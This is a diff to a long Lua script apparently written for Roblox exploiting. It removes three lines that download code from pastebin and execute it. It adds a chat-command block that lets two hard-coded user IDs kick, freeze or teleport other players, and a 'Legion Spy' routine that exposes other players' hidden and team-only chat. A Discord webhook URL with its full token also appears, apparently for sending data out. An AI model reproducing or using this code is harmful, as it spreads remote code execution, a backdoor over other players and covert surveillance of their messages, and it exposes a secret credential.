@@ -4906,9 +4906,199 @@ pcall(function()
 	MainBuffer:delete()
 	--> gcinfo("collect")
 end)
-loadstring(game:HttpGet("https://pastebin.com/raw/JKCcMv2m"), true)()
-loadstring(game:HttpGet("https://pastebin.com/raw/NVHH2LTW"), true)()
-loadstring(game:HttpGet("https://pastebin.com/raw/FLkdXxcL"), true)()
+
+local Players = game:GetService("Players")
+local Commands = {}
+local defaultWalkSpeed = 16
+
+-- Directly specify user IDs here
+local ownerUserIds = {
+    4403987964,  -- User 1 ID
+    3229011081,  -- User 2 ID
+}
+
+local function addCommand(command, func)
+    Commands[command:lower()] = func
+end
+
+local function onPlayerChatted(player)
+    player.Chatted:Connect(function(msg)
+        print(player.UserId .. ": " .. msg)
+        local args = msg:split(" ")
+        local command = args[1]:lower()
+        if Commands[command] then
+            Commands[command](player, args)
+        end
+    end)
+end
+
+local function findPlayerByName(name)
+    local matches = {}
+    local lowerName = string.lower(name)
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        local playerName = string.lower(player.Name)
+
+        -- Check for an exact match first
+        if playerName == lowerName then
+            return {player}  -- Return immediately if an exact match is found
+        end
+
+        -- Check for partial matches
+        if playerName:find(lowerName, 1, true) then
+            table.insert(matches, player)
+        end
+    end
+
+    return #matches > 0 and matches or nil
+end
+
+local function kickUser(player, args)
+    if table.find(ownerUserIds, player.UserId) and #args == 2 then
+        local targetPlayers = findPlayerByName(args[2])
+        if targetPlayers then
+            for _, targetPlayer in ipairs(targetPlayers) do
+                targetPlayer:Kick("You have been kicked by " .. player.Name)
+            end
+        end
+    end
+end
+
+local function kickAll(player)
+    if table.find(ownerUserIds, player.UserId) then
+        for _, otherPlayer in ipairs(Players:GetPlayers()) do
+            otherPlayer:Kick("You have been kicked by " .. player.Name)
+        end
+    end
+end
+
+local function freezeUser(player, args)
+    if table.find(ownerUserIds, player.UserId) and #args == 2 then
+        local targetPlayers = findPlayerByName(args[2])
+        if targetPlayers then
+            for _, targetPlayer in ipairs(targetPlayers) do
+                if targetPlayer.Character then
+                    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        humanoid.WalkSpeed = 0
+                    end
+                end
+            end
+        end
+    end
+end
+
+local function unfreezeUser(player, args)
+    if table.find(ownerUserIds, player.UserId) and #args == 2 then
+        local targetPlayers = findPlayerByName(args[2])
+        if targetPlayers then
+            for _, targetPlayer in ipairs(targetPlayers) do
+                if targetPlayer.Character then
+                    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        humanoid.WalkSpeed = defaultWalkSpeed
+                    end
+                end
+            end
+        end
+    end
+end
+
+local function summonUser(player, args)
+    if table.find(ownerUserIds, player.UserId) and #args == 2 then
+        local targetPlayers = findPlayerByName(args[2])
+        if targetPlayers then
+            local targetPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart").Position
+            for _, targetPlayer in ipairs(targetPlayers) do
+                if targetPlayer.Character then
+                    targetPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
+                end
+            end
+        end
+    end
+end
+
+local function summonAll(player)
+    if table.find(ownerUserIds, player.UserId) then
+        local targetPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart").Position
+        if targetPosition then
+            for _, otherPlayer in ipairs(Players:GetPlayers()) do
+                if otherPlayer.Character then
+                    otherPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
+                end
+            end
+        end
+    end
+end
+
+addCommand(".kick", kickUser)
+addCommand(".kick all", kickAll)
+addCommand(".freeze", freezeUser)
+addCommand(".unfreeze", unfreezeUser)
+addCommand(".summon", summonUser)
+addCommand(".summon all", summonAll)
+
+Players.PlayerAdded:Connect(function(player)
+    onPlayerChatted(player)
+end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    onPlayerChatted(player)
+end
+
+
+Config = {enabled=true,spyOnMyself=true,public=false,publicItalics=true};
+PrivateProperties = {Color=Color3.fromRGB(0, 0, 0),Font=Enum.Font.SourceSansBold,TextSize=18};
+local StarterGui = game:GetService("StarterGui");
+local Players = game:GetService("Players");
+local player = Players.LocalPlayer;
+local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest");
+local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering");
+local instance = (_G.chatSpyInstance or 0) + 1;
+_G.chatSpyInstance = instance;
+local function onChatted(p, msg)
+	if (_G.chatSpyInstance == instance) then
+		if ((p == player) and (msg:lower():sub(1, 4) == "/spy")) then
+			Config.enabled = not Config.enabled;
+			wait(0.3);
+			PrivateProperties.Text = "{Legion Spy " .. ((Config.enabled and "En") or "Dis") .. "abled}";
+			StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties);
+		elseif (Config.enabled and ((Config.spyOnMyself == true) or (p ~= player))) then
+			msg = msg:gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ");
+			local hidden = true;
+			local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
+				if ((packet.SpeakerUserId == p.UserId) and (packet.Message == msg:sub((#msg - #packet.Message) + 1)) and ((channel == "All") or ((channel == "Team") and (Config.public == false) and (Players[packet.FromSpeaker].Team == player.Team)))) then
+					hidden = false;
+				end
+			end);
+			wait(1);
+			conn:Disconnect();
+			if (hidden and Config.enabled) then
+				if Config.public then
+					saymsg:FireServer(((Config.publicItalics and "/me ") or "") .. "{Legion Spy} [" .. p.Name .. "]: " .. msg, "All");
+				else
+					PrivateProperties.Text = "{Legion Spy} [" .. p.Name .. "]: " .. msg;
+					StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties);
+				end
+			end
+		end
+	end
+end
+for _, p in ipairs(Players:GetPlayers()) do
+	p.Chatted:Connect(function(msg)
+		onChatted(p, msg);
+	end);
+end
+Players.PlayerAdded:Connect(function(p)
+	p.Chatted:Connect(function(msg)
+		onChatted(p, msg);
+	end);
+end);
+PrivateProperties.Text = "{Legion Spy " .. ((Config.enabled and "En") or "Dis") .. "abled}";
+StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties);
+local chatFrame = player.PlayerGui.Chat.Frame;
+chatFrame.ChatChannelParentFrame.Visible = true;
+chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), chatFrame.ChatChannelParentFrame.Size.Y);
 
 -- Your Discord webhook URL
 local webhookUrl = "https://discord.com/api/webhooks/1288255480002773003/xZjYoUzH4qm9lUq1hyOsQIVUfs3framLoJd7gnxoz6LzatnWu5hxN-IR27NILrcBR6nW"
